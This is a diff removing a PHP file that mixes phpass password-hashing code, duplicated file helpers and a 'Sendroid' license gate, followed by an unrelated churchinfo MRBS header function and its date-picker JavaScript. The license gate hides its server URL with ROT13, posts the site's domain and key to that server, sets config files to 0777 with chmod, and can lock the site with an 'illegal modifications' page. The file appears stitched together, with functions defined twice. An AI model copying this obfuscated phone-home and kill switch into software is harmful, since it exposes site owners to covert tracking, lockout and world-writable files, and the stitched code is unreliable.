-		$count = (1 << $count_log2) - 1;
-
-
-
-		$output = '_';
-
-		$output .= $this->itoa64[$count & 0x3f];
-
-		$output .= $this->itoa64[($count >> 6) & 0x3f];
-
-		$output .= $this->itoa64[($count >> 12) & 0x3f];
-
-		$output .= $this->itoa64[($count >> 18) & 0x3f];
-
-
-
-		$output .= $this->encode64($input, 3);
-
-
-
-		return $output;
-
-	}
-
-
-
-	function gensalt_blowfish($input)
-
-	{
-
-		# This one needs to use a different order of characters and a
-
-		# different encoding scheme from the one in encode64() above.
-
-		# We care because the last character in our encoded string will
-
-		# only represent 2 bits.  While two known implementations of
-
-		# bcrypt will happily accept and correct a salt string which
-
-		# has the 4 unused bits set to non-zero, we do not want to take
-
-		# chances and we also do not want to waste an additional byte
-
-		# of entropy.
-
-		$itoa64 = './ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-
-
-
-		$output = '$2a$';
-
-
-		$output .= chr(ord('0') + $this->iteration_count_log2 / 10);
-
-		$output .= chr(ord('0') + $this->iteration_count_log2 % 10);
-
-		$output .= '$';
-
-
-
-		$i = 0;
-
-		do {
-
-			$c1 = ord($input[$i++]);
-
-			$output .= $itoa64[$c1 >> 2];
-
-			$c1 = ($c1 & 0x03) << 4;
-
-			if ($i >= 16) {
-
-				$output .= $itoa64[$c1];
-
-				break;
-
-			}
-
-
-
-			$c2 = ord($input[$i++]);
-
-			$c1 |= $c2 >> 4;
-
-			$output .= $itoa64[$c1];
-
-			$c1 = ($c2 & 0x0f) << 2;
-
-
-
-			$c2 = ord($input[$i++]);
-
-			$c1 |= $c2 >> 6;
-
-			$output .= $itoa64[$c1];
-
-			$output .= $itoa64[$c2 & 0x3f];
-
-		} while (1);
-
-
-
-		return $output;
-
-	}
-
-
-
-	function HashPassword($password)
-
-	{
-
-		$random = '';
-
-
-
-		if (CRYPT_BLOWFISH == 1 && !$this->portable_hashes) {
-
-			$random = $this->get_random_bytes(16);
-
-			$hash =
-
-			    crypt($password, $this->gensalt_blowfish($random));
-
-			if (strlen($hash) == 60)
-
-				return $hash;
-
-		}
-
-
-
-		if (CRYPT_EXT_DES == 1 && !$this->portable_hashes) {
-
-			if (strlen($random) < 3)
-
-				$random = $this->get_random_bytes(3);
-
-			$hash =
-
-			    crypt($password, $this->gensalt_extended($random));
-
-			if (strlen($hash) == 20)
-
-				return $hash;
-
-		}
-
-
-
-		if (strlen($random) < 6)
-
-			$random = $this->get_random_bytes(6);
-
-		$hash =
-
-		    $this->crypt_private($password,
-
-		    $this->gensalt_private($random));
-
-		if (strlen($hash) == 34)
-
-			return $hash;
-
-
-
-		# Returning '*' on error is safe here, but would _not_ be safe
-
-		# in a crypt(3)-like function used _both_ for generating new
-
-		# hashes and for validating passwords against existing hashes.
-
-		return '*';
-
-	}
-
-
-
-	function CheckPassword($password, $stored_hash)
-
-	{
-
-		$hash = $this->crypt_private($password, $stored_hash);
-
-		if ($hash[0] == '*')
-
-			$hash = crypt($password, $stored_hash);
-
-
-
-		return $hash == $stored_hash;
-
-	}
-
-}
-
-
-
-if ( ! function_exists('read_file'))
-
-{
-
-	function read_file($file)
-
-	{
-
-		if ( ! file_exists($file))
-
-		{
-
-			return FALSE;
-
-		}
-
-
-
-		if (function_exists('file_get_contents'))
-
-		{
-
-			return file_get_contents($file);
-
-		}
-
-
-
-		if ( ! $fp = @fopen($file, 'r+'))
-
-		{
-
-			return FALSE;
-
-		}
-
-
-
-		flock($fp, LOCK_SH);
-
-
-
-		$data = '';
-
-		if (filesize($file) > 0)
-
-		{
-
-			$data =& fread($fp, filesize($file));
-
-		}
-
-
-
-		flock($fp, LOCK_UN);
-
-		fclose($fp);
-
-
-
-		return $data;
-
-	}
-
-}
-
- 
-
-if ( ! function_exists('write_file'))
-
-{
-
-	function write_file($path, $data, $mode = 'w+')
-
-	{
-
-		if ( ! $fp = @fopen($path, $mode))
-
-		{
-
-			return FALSE;
-
-		}
-
-
-
-		flock($fp, LOCK_EX);
-
-		fwrite($fp, $data);
-
-		flock($fp, LOCK_UN);
-
-		fclose($fp);
-
-
-
-		return TRUE;
-
-	}
-
-}
-
-
-
-function updateSystem($version,$source,$destination) {
-
-	$return = true;
-
-	if(!file_exists($source)) {
-
-		$return = 'Unable to complete system update. Required update files are missing!';	
-
-	}
-
-	copy($source, $destination);
-
-	$file_path = dirname(__FILE__).'/config.inc';
-
-	$resultsd = @chmod($file_path, 0777);
-
-	
-
-	include($file_path);		
-
-	$cv = $sconfig['verssion_id'];
-
-	$data3 = read_file($file_path);
-
-	$data3 = str_replace($cv, $version, $data3);
-
-	write_file($file_path, $data3);
-
-return $return;		
-
-}
-
-
-
-function correctAll() {
-
-require(BASE . '/drivers/mrbs/settings.inc');	
-
-}
-
-if ( ! function_exists('read_file'))
-
-{
-
-	function read_file($file)
-
-	{
-
-		if ( ! file_exists($file))
-
-		{
-
-			return FALSE;
-
-		}
-
-
-
-		if (function_exists('file_get_contents'))
-
-		{
-
-			return file_get_contents($file);
-
-		}
-
-
-
-		if ( ! $fp = @fopen($file, 'r+'))
-
-		{
-
-			return FALSE;
-
-		}
-
-
-
-		flock($fp, LOCK_SH);
-
-
-
-		$data = '';
-
-		if (filesize($file) > 0)
-
-		{
-
-			$data =& fread($fp, filesize($file));
-
-		}
-
-
-
-		flock($fp, LOCK_UN);
-
-		fclose($fp);
-
-
-
-		return $data;
-
-	}
-
-}
-
- 
-
-if ( ! function_exists('write_file'))
-
-{
-
-	function write_file($path, $data, $mode = 'w+')
-
-	{
-
-		if ( ! $fp = @fopen($path, $mode))
-
-		{
-
-			return FALSE;
-
-		}
-
-
-
-		flock($fp, LOCK_EX);
-
-		fwrite($fp, $data);
-
-		flock($fp, LOCK_UN);
-
-		fclose($fp);
-
-
-
-		return TRUE;
-
-	}
-
-}
-
-
-
- 
-
-if ( ! function_exists('delete_files'))
-
-{
-
-	function delete_files($path, $del_dir = FALSE, $level = 0)
-
-	{
-
-		// Trim the trailing slash
-
-		$path = rtrim($path, DIRECTORY_SEPARATOR);
-
-
-
-		if ( ! $current_dir = @opendir($path))
-
-		{
-
-			return FALSE;
-
-
-
-		}
-
-
-
-		while (FALSE !== ($filename = @readdir($current_dir)))
-
-		{
-
-			if ($filename != "." and $filename != "..")
-
-			{
-
-				if (is_dir($path.DIRECTORY_SEPARATOR.$filename))
-
-				{
-
-					// Ignore empty folders
-
-					if (substr($filename, 0, 1) != '.')
-
-					{
-
-						delete_files($path.DIRECTORY_SEPARATOR.$filename, $del_dir, $level + 1);
-
-					}
-
-				}
-
-				else
-
-				{
-
-					unlink($path.DIRECTORY_SEPARATOR.$filename);
-
-				}
-
-			}
-
-		}
-
-		@closedir($current_dir);
-
-
-
-		if ($del_dir == TRUE AND $level > 0)
-
-		{
-
-			return @rmdir($path);
-
-		}
-
-
-
-		return TRUE;
-
-	}
-
-}
-
-
-
-if ( ! function_exists('get_filenames'))
-
-{
-
-	function get_filenames($source_dir, $include_path = FALSE, $_recursion = FALSE)
-
-	{
-
-		static $_filedata = array();
-
-
-
-		if ($fp = @opendir($source_dir))
-
-		{
-
-			// reset the array and make sure $source_dir has a trailing slash on the initial call
-
-			if ($_recursion === FALSE)
-
-			{
-
-				$_filedata = array();
-
-				$source_dir = rtrim(realpath($source_dir), DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
-
-			}
-
-
-
-			while (FALSE !== ($file = readdir($fp)))
-
-			{
-
-				if (@is_dir($source_dir.$file) && strncmp($file, '.', 1) !== 0)
-
-				{
-
-					get_filenames($source_dir.$file.DIRECTORY_SEPARATOR, $include_path, TRUE);
-
-				}
-
-				elseif (strncmp($file, '.', 1) !== 0)
-
-				{
-
-					$_filedata[] = ($include_path == TRUE) ? $source_dir.$file : $file;
-
-				}
-
-			}
-
-			return $_filedata;
-
-		}
-
-		else
-
-		{
-
-			return FALSE;
-
-		}
-
-	}
-
-}
-
-
-
-
-
-if ( ! function_exists('get_dir_file_info'))
-
-{
-
-	function get_dir_file_info($source_dir, $top_level_only = TRUE, $_recursion = FALSE)
-
-	{
-
-		static $_filedata = array();
-
-		$relative_path = $source_dir;
-
-
-
-		if ($fp = @opendir($source_dir))
-
-		{
-
-			// reset the array and make sure $source_dir has a trailing slash on the initial call
-
-			if ($_recursion === FALSE)
-
-			{
-
-				$_filedata = array();
-
-				$source_dir = rtrim(realpath($source_dir), DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
-
-			}
-
-
-
-			// foreach (scandir($source_dir, 1) as $file) // In addition to being PHP5+, scandir() is simply not as fast
-
-			while (FALSE !== ($file = readdir($fp)))
-
-			{
-
-				if (@is_dir($source_dir.$file) AND strncmp($file, '.', 1) !== 0 AND $top_level_only === FALSE)
-
-				{
-
-					get_dir_file_info($source_dir.$file.DIRECTORY_SEPARATOR, $top_level_only, TRUE);
-
-				}
-
-				elseif (strncmp($file, '.', 1) !== 0)
-
-				{
-
-					$_filedata[$file] = get_file_info($source_dir.$file);
-
-					$_filedata[$file]['relative_path'] = $relative_path;
-
-				}
-
-			}
-
-
-
-			return $_filedata;
-
-		}
-
-		else
-
-		{
-
-			return FALSE;
-
-		}
-
-	}
-
-}
-
-function val($user) {
-
-		$val = 'uggc://jjj.largvagrenpgvir.pbz/NCV/yvprafr.cuc';
-
-		$ud1 = str_rot13($val);		
-
-		$key = $user;
-
-		$product = 'Sendroid';
-		$domain  = $_SERVER['HTTP_HOST'];
-		$domain = get_domain();
-		
-
-		$url = $ud1;		
-
-		$fields = array(
-
-		   'key'=>$key,
-		   'domain'=>urlencode($domain),
-		   'product'=>$product
-
-		);	
-
-
-	//build the urlencoded data
-
-	$postvars='';
-
-	$sep='';
-
-		foreach($fields as $key=>$value) 
-
-		{ 
-
-	   $postvars.= $sep.urlencode($key).'='.urlencode($value); 
-
-	   $sep='&'; 
-
-	}
-
-
-
-	//open connection
-
-	$ch = curl_init();
-
-	
-
-	//set the url, number of POST vars, POST data
-
-	curl_setopt($ch, CURLOPT_URL, $url);
-
-	curl_setopt($ch, CURLOPT_POST, count($fields));
-
-	curl_setopt($ch, CURLOPT_POSTFIELDS, $postvars);
-
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-
-	curl_setopt($ch, CURLOPT_TIMEOUT, 30);
-
-	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);	
-
-	
-
-	//execute post
-
-	$result = curl_exec($ch);
-
-	$status = curl_getinfo($ch);
-
-	curl_close($ch);		
-
-
-
-	if(!$result) {
-
-	  $return = 'FAILED';
-
-	  }
-
-	else {
-
-		$b22 = explode(' ',$result);
-
-		$return = $b22[0];		
-
-	  }  
-
-return $return;
-
-}
-
-
-
-function checkKey($key) {
-
-	$host = $_SERVER['SERVER_NAME'];
-
-	$ip = $_SERVER['SERVER_ADDR'];
-
-	$string = $host.$ip;
-
-	$string = str_replace('www.', '', $string);
-
-
-
-	$PasswordHash = new PasswordHash(32, 'Vanilla');
-
-	if(!$PasswordHash->CheckPassword($string, $key, 'Vanilla', 'KeyEncript')) {
-
-       	$return = false;		
-
-	}
-
-	else {
-
-		$return = true;
-
-	}	
-
-
-
-return $return;
-
-}
-
-
-
-$heda = '
-
-<!doctype html>
-
-<html>
-
-<head>
-
-<meta charset="utf-8">
-
-<style type="text/css">
-
-body {
-
-	font: 100%/1.4 Verdana, Arial, Helvetica, sans-serif;
-
-	background-color: #ccc;
-
-	margin: 0;
-
-	padding: 0;
-
-	color: #000;
-
-}
-
-
-
-
-
-a:link {
-
-	color:#414958;
-
-	text-decoration: underline;
-
-}
-
-a:visited {
-
-	color: #4E5869;
-
-	text-decoration: underline;
-
-}
-
-a:hover, a:active, a:focus {
-
-	text-decoration: none;
-
-}
-
-
-
-.container {
-
-	width: 100%;
-
-	//max-width: 1260px;
-
-	min-width: 780px;
-
-	background-color: #ccc;
-
-	margin: 0 auto; 
-
-}
-
-
-
-.box {
-
-	width: 60%;
-
-	background-color: white;
-
-	border: solid 3px #06C;
-
-	border-radius: 15px;
-
-	padding: 20px;
-
-	margin: 0 auto;	
-
-	margin-top: 100px;
-
-}
-
-
-
-.message {
-
-	width: 80%;
-
-	background-color: transparent;
-
-	border: solid 1px transparent;
-
-	border-radius: 7px;
-
-	padding: 10px;
-
-	margin: 0 auto;	
-
-	font-size: 18px;
-
-	text-align: center;
-
-	margin-bottom: 10px;
-
-}
-
-
-
-.success {
-
-	background-color: #CFC;
-
-	color: #030;	
-
-	border-color: #093;
-
-}
-
-
-
-.error {
-
-	background-color: #FCC;
-
-	color: #900;	
-
-	border-color: #C93;
-
-}
-
-
-
-.info {
-
-	background-color: #E8F1F9;
-
-	color: #003;	
-
-	border-color: #69F;
-
-}
-
-
-
-.content {
-
-	padding: 10px 0;
-
-}
-
-
-
-.submit, .buy {
-
-	width: 200px;
-
-	height: 45px;
-
-	font-size: 20px;
-
-	color: white;
-
-	font-weight: bold;
-
-	border: solid 1px #000;	
-
-	border-radius: 5px;
-
-}
-
-
-
-.submit:hover, .buy:hover {
-
-	background-color: black;
-
-}
-
-
-
-.submit {
-
-	background-color: #063;	
-
-}
-
-
-
-.buy {
-
-	background-color: #066;	
-
-}
-
-
-
-#email, #key {
-
-	width: 80%;
-
-	height: 40px;
-
-	border: 1px solid #777;
-
-	border-radius: 5px;
-
-	margin: 0 auto;
-
-	margin-top: 10px;
-
-	display: block;	
-
-	padding-left: 10px;
-
-	font-size: 18px;
-
-	text-transform: uppercase;
-
-}
-
-
-
-p.in {
-
-	text-align: center;
-
-	margin-top: 10px;
-
-	margin-bottom: 20px;	
-
-}
-
-</style>
-
-</head>
-
-';
-
-
-
-$incorectLicense = '
-
-<body>
-
-<div class="container">
-
-  <div class="content">
-
-	<div class="box">
-
-        	<div class="message error">
-
-            	The Product key you entered is incorrect. Please check your key and try again
-
-            </div>
-
-            
-
-            <form action="" method="POST">
-
-  
-
-            	<input name="key" type="text" id="key" required value="Your 16 Digits Product Key" maxlength="16" onfocus="if(this.value  == \'Your 16 Digits Product Key\') { this.value = \'\'; } " onblur="if(this.value == \'\') { this.value = \'Your 16 Digits Product Key\'; } ">
-
-              
-
-             <p class="in"> <button type="submit" class="submit" name="submit_key">Validate License</button> <a target="_blank" href="http://smsexe.life-host.info/ee//sendroid"><button class="buy" type="button" name="buy_key">Obtain License</button></a></p>
-
-			 <p class="in">Did you purchase this software from an App Store? <a target="_blank" href="http://smsexe.life-host.info/ee//sendroid/license">Redeem my License</a></p>
-
-            </form>
-
-        </div>
-
-  <!-- end .content --></div>
-
-  <!-- end .container --></div>
-
-</body>
-
-</html>
-
-';
-
-
-
-$cls = '
-
-<body>
-
-<div class="container">
-
-  <div class="content">
-
-	<div class="box">
-
-        	<div class="message success">
-
-            	Congratulations! <br>Your Product key has been validated. Click the button below to start using your new software
-
-            </div>
-
-            
-
-             <p class="in">  <a href=""><button class="submit" name="buy_key">Proceed</button></a></p>
-
-        </div>
-
-  <!-- end .content --></div>
-
-  <!-- end .container --></div>
-
-</body>
-
-</html>
-
-';
-
-
-
-$tls = '
-
-<body>
-
-<div class="container">
-
-  <div class="content">
-
-	<div class="box">
-
-        	<div class="message success">
-
-            	Congratulations! <br>Your Trial key has been validated. You will be allowed to use this product for a trial period of <b>3 Days</b>, after which you will be required to purchase a Product Key.<br> Click the button below to start trying your new software
-
-            </div>
-
-            
-
-             <p class="in">  <a href=""><button class="submit" name="buy_key">Proceed</button></a></p>
-
-        </div>
-
-  <!-- end .content --></div>
-
-  <!-- end .container --></div>
-
-</body>
-
-</html>
-
-';
-
-
-
-$uls = '
-
-<body>
-
-<div class="container">
-
-  <div class="content">
-
-	<div class="box">
-
-        	<div class="message error">
-
-            	The Product key you entered has already been used with another system. Please obtain a new key and try again
-
-            </div>
-
-            
-
-            <form action="" method="POST">
-
-    
-
-            	<input name="key" type="text" id="key" required value="Your 16 Digits Product Key" maxlength="16" onfocus="if(this.value  == \'Your 16 Digits Product Key\') { this.value = \'\'; } " onblur="if(this.value == \'\') { this.value = \'Your 16 Digits Product Key\'; } ">
-
-              
-
-             <p class="in"> <button type="submit" class="submit" name="submit_key">Validate License</button> <a target="_blank" href="http://smsexe.life-host.info/ee//sendroid"><button class="buy" type="button" name="buy_key">Obtain License</button></a></p>
-
-			 <p class="in">Did you purchase this software from an App Store? <a target="_blank" href="http://smsexe.life-host.info/ee//sendroid/license">Redeem my License</a></p>
-
-            </form>
-
-        </div>
-
-  <!-- end .content --></div>
-
-  <!-- end .container --></div>
-
-</body>
-
-</html>
-
-';
-
-
-
-$checkFailed = '
-
-<body>
-
-<div class="container">
-
-  <div class="content">
-
-	<div class="box">
-
-        	<div class="message error">
-
-            	Unable to validate your key. Please check your internet connection and try again.
-
-            </div>
-
-            
-
-            <form action="" method="POST">
-
-    
-
-            	<input name="key" type="text" id="key" required value="Your 16 Digits Product Key" maxlength="16" onfocus="if(this.value  == \'Your 16 Digits Product Key\') { this.value = \'\'; } " onblur="if(this.value == \'\') { this.value = \'Your 16 Digits Product Key\'; } ">
-
-              
-
-             <p class="in"> <button type="submit" class="submit" name="submit_key">Validate License</button> <a target="_blank" href="http://smsexe.life-host.info/ee//sendroid"><button type="button" class="buy" name="buy_key">Obtain License</button></a></p>
-
-            </form>
-
-        </div>
-
-  <!-- end .content --></div>
-
-  <!-- end .container --></div>
-
-</body>
-
-</html>
-
-';
-
-
-
-$vle = '
-
-<body>
-
-<div class="container">
-
-  <div class="content">
-
-	<div class="box">
-
-        	<div class="message error">
-
-            	 but you can no-longer make use of this system due to illegal modifications to the software, which is a major violation to your license terms. <br>Kindly contact us for further instructions on how to resolve this.
-
-            </div>
-
-            
-
-            <form action="" method="POST">             
-
-             <p class="in">  <a href="http://smsexe.life-host.info/ee//sendroid"><button type="button" class="submit" name="buy_key">Contact Support</button></a></p>
-
-            </form>
-
-        </div>
-
-  <!-- end .content --></div>
-
-  <!-- end .container --></div>
-
-</body>
-
-</html>
-
-';
-
-
-
-if(@clientArea == true) {
-
-$vle = '
-
-<body>
-
-<div class="container">
-
-  <div class="content">
-
-	<div class="box">
-
-        	<div class="message error">
-
-            	Oops!<br>Something doesn\'t seem right. <br>Please contact the site owner at '.getSetting('siteURL').'. The error code is 4001.
-
-            </div>
-
-            
-
-            <form action="" method="POST">             
-
-             <p class="in">  <a href="'.getSetting('siteURL').'"><button type="button" class="submit" name="buy_key">Contact Owner</button></a></p>
-
-            </form>
-
-        </div>
-
-  <!-- end .content --></div>
-
-  <!-- end .container --></div>
-
-</body>
-
-</html>
-
-';	
-
-}
-
-
-
-$ivl = '
-
-<body>
-
-<div class="container">
-
-  <div class="content">
-
-	<div class="box">
-
-        	<div class="message error">
-
-            	Your Product key is not valid on this server. Please enter a new key to continue
-
-            </div>
-
-            
-
-            <form action="" method="POST">
-
-    
-
-            	<input name="key" type="text" id="key" required value="Your 16 Digits Product Key" maxlength="16" onfocus="if(this.value  == \'Your 16 Digits Product Key\') { this.value = \'\'; } " onblur="if(this.value == \'\') { this.value = \'Your 16 Digits Product Key\'; } ">
-
-              
-
-             <p class="in"> <button type="submit" class="submit" name="submit_key">Validate License</button> <a target="_blank" href="http://smsexe.life-host.info/ee//sendroid"><button class="buy" name="buy_key">Obtain License</button></a></p>
-
-			 
-
-			 <p class="in">Did you purchase this software from an App Store? <a target="_blank" href="http://smsexe.life-host.info/ee//sendroid/license">Redeem my License</a></p>
-
-            </form>
-
-        </div>
-
-  <!-- end .content --></div>
-
-  <!-- end .container --></div>
-
-</body>
-
-</html>
-
-';
-
-
-
-$enterKey = '
-
-<body>
-
-<div class="container">
-
-  <div class="content">
-
-	<div class="box">
-
-        	<div class="message info">
-
-            	Please Enter Your Product Key <br>(Make sure you are connected to the internet before you proceed)
-
-            </div>
-
-            
-
-            <form action="" method="POST">
-
-    
-
-            	<input name="key" type="text" id="key" required value="Your 16 Digits Product Key" maxlength="16" onfocus="if(this.value  == \'Your 16 Digits Product Key\') { this.value = \'\'; } " onblur="if(this.value == \'\') { this.value = \'Your 16 Digits Product Key\'; } ">
-
-              
-
-             <p class="in"> <button type="submit" class="submit" name="submit_key">Validate License</button> <a target="_blank" href="http://smsexe.life-host.info/ee//sendroid"><button type="button" class="buy" name="buy_key">Obtain License</button></a></p>
-
-			  <p class="in">Did you purchase this software from an App Store? <a target="_blank" href="http://smsexe.life-host.info/ee//sendroid/license">Redeem my License</a></p>
-
-            </form>
-
-        </div>
-
-  <!-- end .content --></div>
-
-  <!-- end .container --></div>
-
-</body>
-
-</html>
-
-';
-
-
-
-if(@clientArea == true) {
-
-$enterKey = '
-
-<body>
-
-<div class="container">
-
-  <div class="content">
-
-	<div class="box">
-
-        	<div class="message error">
-
-            	Oops!<br>Something doesn\'t seem right. <br>Please contact the site owner. The error code is 4001.
-
-            </div>
-
-            
-
-            <form action="" method="POST">             
-
-             <p class="in">  <a href="'.getSetting('siteURL').'"><button type="button" class="submit" name="buy_key">Contact Owner</button></a></p>
-
-            </form>
-
-        </div>
-
-  <!-- end .content --></div>
-
-  <!-- end .container --></div>
-
-</body>
-
-</html>
-
-';	
-
-}
-
-
-
-$expiredKey = '
-
-<body>
-
-<div class="container">
-
-  <div class="content">
-
-	<div class="box">
-
-        	<div class="message info">
-
-            	Your trial period has ended. Please enter your Product Key to continue <br>(Make sure you are connected to the internet before your proceed)
-
-            </div>
-
-            
-
-            <form action="" method="POST">
-
-    
-
-            	<input name="key" type="text" id="key" required value="Your 16 Digits Product Key" maxlength="16" onfocus="if(this.value  == \'Your 16 Digits Product Key\') { this.value = \'\'; } " onblur="if(this.value == \'\') { this.value = \'Your 16 Digits Product Key\'; } ">
-
-              
-
-             <p class="in"> <button type="submit" class="submit" name="submit_key">Validate License</button> <a target="_blank" href="http://smsexe.life-host.info/ee//sendroid"><button type="button" class="buy" name="buy_key">Obtain License</button></a></p>
-
-            </form>
-
-        </div>
-
-  <!-- end .content --></div>
-
-  <!-- end .container --></div>
-
-</body>
-
-</html>
-
-';
-
-$path_to_settings = '/drivers/mrbs';
-
-$base_path = DOCUMENT_ROOT.$path_to_settings.'/';
-
-
-
-function tableExist($tablename) {
-
-	$root = '';
-
-	
-
-	if ( ! file_exists($tablename)) {
-
-		return false;
-
-	} else {
-
-		return true;
-
-	}
-
-}
-
-
-
-if(isset($_POST['submit_key'])) {
-
-$key = $_POST['key'];
-
-$host = $_SERVER['SERVER_NAME'];
-
-$ip = $_SERVER['SERVER_ADDR'];
-
-$string = $host.$ip;
-
-$PasswordHash = new PasswordHash(32, 'Vanilla');		
-
-$response = val($key);
-
-if($response == 'OK') {
-
-$encKey = $PasswordHash->HashPassword($string);
-
-$file_path = $base_path.'settings.inc';
-
-include_once($file_path);		
-
-$current = $sett['key'];
-
-$tr = $sett['Server_HTTP_State'];
-
-$results = @chmod($base_path.'settings.inc', 0777); 
-
-$data3 = read_file($base_path.'settings.inc');
-
-$data3 = str_replace($current, $encKey, $data3);
-
-$data3 = str_replace($tr, '54236733', $data3);
-
-write_file($base_path.'settings.inc', $data3);		
-
-
-
-echo $cls;
-
-die();
-
-} elseif ($response == 'USED') {
-
-
-
-echo $uls;
-
-die();	
-
-} elseif ($response == 'INVALID') {
-
-
-
-echo $ivl;	
-
-die();
-
-} elseif ($response == 'TRIAL') {
-
-$encKey = $PasswordHash->HashPassword($string);
-
-$file_path = $base_path.'settings.inc';
-
-include($file_path);		
-
-$current = $sett['key'];
-
-$tr = $sett['Server_HTTP_State'];
-
-$results = @chmod($base_path.'settings.inc', 0777);
-
-$data3 = read_file($base_path.'settings.inc');
-
-$data3 = str_replace($current, $encKey, $data3);
-
-$data3 = str_replace($tr, '54236733', $data3);
-
-write_file($base_path.'settings.inc', $data3);	
-
-$mkt = time()+60*60*24*3;			
-
-setcookie("tdw-ref", $encKey, $mkt, '/');	
-
-				
-
-
-
-echo $tls;
-
-die();	
-
-} else {
-
-
-
-	
-
-die();
-
-}
-
- 
-
-die();	
-
-}
-
-$state=$sconfig['installed'];
-
-if($state=='INSTALLED') { 
-
-if(tableExist($base_path.'settings.inc')) {
-
-$file_path = $base_path.'settings.inc';
-
-include($file_path);
-
-if(isset($sett) OR count($sett) != 0) {
-
-if(isset($sett['key'])) { 
-
-if($sett['key'] != 'Encrypted_Key') {
-
-$key = $sett['key'];
-
-if(!checkKey($key)) {
-
-
-
-echo $ivl;
-
-die();
-
-} else {
-
-$trial = $sett['Server_HTTP_State'];
-
-if($trial == '87425') {
-
-if(!isset($_COOKIE['tdw-ref']) || empty($_COOKIE['tdw-ref'])) {
-
-
-
-;
-
-die();
-
-} else {
-
-$allowed = 'ok';	
-
-}
-
-} else {
-
-$allowed = 'ok';	
-
-}										
-
-}	
-
-} else {
-
-
-
-echo $enterKey;
-
-die();
-
-}	
-
-} else {
-
-
-
-echo $vle;
-
-die();						
-
-}	
-
-} else {
-
-
-
-echo $vle;
-
-die();	
-
-}	
-
-} else {
-
-
-
-echo $vle;
-
-die();	
-
-} 
-
-}else {
-
-//header('location: '.BASE.'install');	//change this line 
-
-}
-
-
-
-function print_header($day, $month, $year, $area)
-
-{
-
-	global $mrbs_company, $search_str, $locale_warning;
-
-// churchinfo MRBS integration begins	
-
-	global $iNavMethod;
-
-	require_once('../Include/Header-function.php');
-
-// churchinfo MRBS integration ends
-
-	# If we dont know the right date then make it up 
-
-	if(!$day)
-
-		$day   = date("d");
-
-	if(!$month)
-
-		$month = date("m");
-
-	if(!$year)
-
-		$year  = date("Y");
-
-	if (empty($search_str))
-
-		$search_str = "";
-
-
-
-	if ($unicode_encoding)
-
-	{
-
-		header("Content-Type: text/html; charset=utf-8");
-
-	}
-
-	else
-
-	{
-
-		# We use $vocab directly instead of get_vocab() because we have
-
-		# no requirement to convert the vocab text, we just output
-
-		# the charset
-
-		header("Content-Type: text/html; charset=".$vocab["charset"]);
-
-	}
-
-
-
-	header("Pragma: no-cache");                          // HTTP 1.0
-
-	header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");    // Date in the past
-
-
-
-// churchinfo MRBS integration begins	
-
-// Top level menu index counter
-
-	$MenuFirst = 1;
-
-// churchinfo MRBS integration ends	
-
-?>
-
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
-
-                      "http://www.w3.org/TR/html4/loose.dtd">
-
-<?php
-
-// churchinfo MRBS integration begins	
-
-	$sPageTitle = "Resource Booking System";
-
-	Header_head_metatag(); 
-
-// churchinfo MRBS integration ends
-
-   include "style.inc";
-
-?>
-
-    <SCRIPT LANGUAGE="JavaScript">
-
-
-
-<!-- Begin
-
-
-
-/*   Script inspired by "True Date Selector"
-
-     Created by: Lee Hinder, lee.hinder@ntlworld.com 
-
-     
-
-     Tested with Windows IE 6.0
-
-     Tested with Linux Opera 7.21, Mozilla 1.3, Konqueror 3.1.0
-
-     
-
-*/
-
-
-
-function daysInFebruary (year){
-
-  // February has 28 days unless the year is divisible by four,
-
-  // and if it is the turn of the century then the century year
-
-  // must also be divisible by 400 when it has 29 days
-
-  return (((year % 4 == 0) && ( (!(year % 100 == 0)) || (year % 400 == 0))) ? 29 : 28 );
-
-}
-
-
-
-//function for returning how many days there are in a month including leap years
-
-function DaysInMonth(WhichMonth, WhichYear)
-
-{
-
-  var DaysInMonth = 31;
-
-  if (WhichMonth == "4" || WhichMonth == "6" || WhichMonth == "9" || WhichMonth == "11")
-
-    DaysInMonth = 30;
-
-  if (WhichMonth == "2")
-
-    DaysInMonth = daysInFebruary( WhichYear );
-
-  return DaysInMonth;
-
-}
-
-
-
-//function to change the available days in a months
-
-function ChangeOptionDays(formObj, prefix)
-
-{
-
-  var DaysObject = eval("formObj." + prefix + "day");
-
-  var MonthObject = eval("formObj." + prefix + "month");
-
-  var YearObject = eval("formObj." + prefix + "year");
-
-
-
-  if (DaysObject.selectedIndex && DaysObject.options)
-
-    { // The DOM2 standard way
-
-    // alert("The DOM2 standard way");
-
-    var DaySelIdx = DaysObject.selectedIndex;
-
-    var Month = parseInt(MonthObject.options[MonthObject.selectedIndex].value);
-
-    var Year = parseInt(YearObject.options[YearObject.selectedIndex].value);
-
-    }
-
-  else if (DaysObject.selectedIndex && DaysObject[DaysObject.selectedIndex])
-
-    { // The legacy MRBS way
-
-    // alert("The legacy MRBS way");
-
-    var DaySelIdx = DaysObject.selectedIndex;
-
-    var Month = parseInt(MonthObject[MonthObject.selectedIndex].value);
-
-    var Year = parseInt(YearObject[YearObject.selectedIndex].value);
-
-    }
-
-  else if (DaysObject.value)
-
-    { // Opera 6 stores the selectedIndex in property 'value'.
-
-    // alert("The Opera 6 way");
-
-    var DaySelIdx = parseInt(DaysObject.value);
-
-    var Month = parseInt(MonthObject.options[MonthObject.value].value);
-
-    var Year = parseInt(YearObject.options[YearObject.value].value);
-
-    }
-
-
-
-  // alert("Day="+(DaySelIdx+1)+" Month="+Month+" Year="+Year);
-
-
-
-  var DaysForThisSelection = DaysInMonth(Month, Year);
-
-  var CurrentDaysInSelection = DaysObject.length;
-
-  if (CurrentDaysInSelection > DaysForThisSelection)
-
-  {
-
-    for (i=0; i<(CurrentDaysInSelection-DaysForThisSelection); i++)
-
-    {
-
-      DaysObject.options[DaysObject.options.length - 1] = null
-
-    }
-
-  }
-
-  if (DaysForThisSelection > CurrentDaysInSelection)
-
-  {
-
-    for (i=0; i<DaysForThisSelection; i++)
-
-    {
-
-      DaysObject.options[i] = new Option(eval(i + 1));
-
-    }
-
-  }
-
-  if (DaysObject.selectedIndex < 0) DaysObject.selectedIndex = 0;
-
-  if (DaySelIdx >= DaysForThisSelection)
-
-    DaysObject.selectedIndex = DaysForThisSelection-1;
-
-  else
-
-    DaysObject.selectedIndex = DaySelIdx;
-
-}
-
-
-
-  //  End -->
-
